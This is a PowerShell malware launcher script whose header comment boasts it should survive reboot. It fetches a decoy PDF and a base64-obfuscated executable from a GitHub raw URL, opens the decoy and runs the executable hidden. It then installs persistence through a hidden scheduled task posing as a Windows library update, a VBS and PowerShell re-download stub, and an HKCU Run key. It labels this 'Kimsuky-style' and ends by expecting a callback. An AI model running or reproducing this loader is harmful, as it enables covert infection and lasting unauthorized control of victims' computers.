# launcher.ps1 - schtasks.exe + persistent folder + AtLogon (should survive reboot now)
$ErrorActionPreference = 'Continue'

function log($msg) { 
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
}

$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
if (-not (Test-Path $persistBase)) { New-Item -ItemType Directory -Path $persistBase -Force | Out-Null }

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

log "Launcher started"

Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

log "Downloading PDF + EXE..."
try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}

if (Test-Path $pdfPath) { 
    try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
}

Start-Sleep -Seconds (Get-Random -Min 20 -Max 40)

try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch { Start-Process $exePath -WindowStyle Hidden }

# === KIMSUKY-STYLE PERSISTENCE WITH schtasks.exe ===
log "Setting up schtasks persistence..."
$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
$vbsPath = "$persistBase\$randName.vbs"
$syncPath = "$persistBase\$randName.ps1"
$taskName = "Windows Library Update Task $randName"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$cache = `"$cache`"
if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
`$exeUrl = `"$exeUrl`"
`$exePath = `"$exePath`"
if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100000)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run(`"`$exePath`", 0, `$false)
} catch { Start-Process `$exePath -WindowStyle Hidden }
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# Create task with schtasks.exe (AtLogon + repeat)
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>$(Get-Date -Format "yyyy-MM-ddTHH:mm:ss")</Date></RegistrationInfo>
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger><StartBoundary>$(Get-Date -Format "yyyy-MM-ddTHH:mm:ss")</StartBoundary><Enabled>true</Enabled></TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType></Principal>
  </Principals>
  <Settings>
    <MultipleInstances>IgnoreNew</MultipleInstances>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyForNetworkAvailable>false</RunOnlyForNetworkAvailable>
    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd></IdleSettings>
    <Hidden>true</Hidden>
  </Settings>
  <Actions Context="Author">
    <Exec><Command>wscript.exe</Command><Arguments>"$vbsPath"</Arguments></Exec>
  </Actions>
</Task>
"@
$xml | Out-File -FilePath "$env:TEMP\task.xml" -Encoding UTF8 -Force

schtasks.exe /Create /TN "$taskName" /XML "$env:TEMP\task.xml" /F | Out-Null
Remove-Item "$env:TEMP\task.xml" -Force -ErrorAction SilentlyContinue

# HKCU Run backup
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $taskName -Value "wscript.exe `"$vbsPath`"" -Type String -Force

log "Persistence registered - Task: $taskName"
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
log "Launcher finished - reboot and check for callback in <90 seconds"
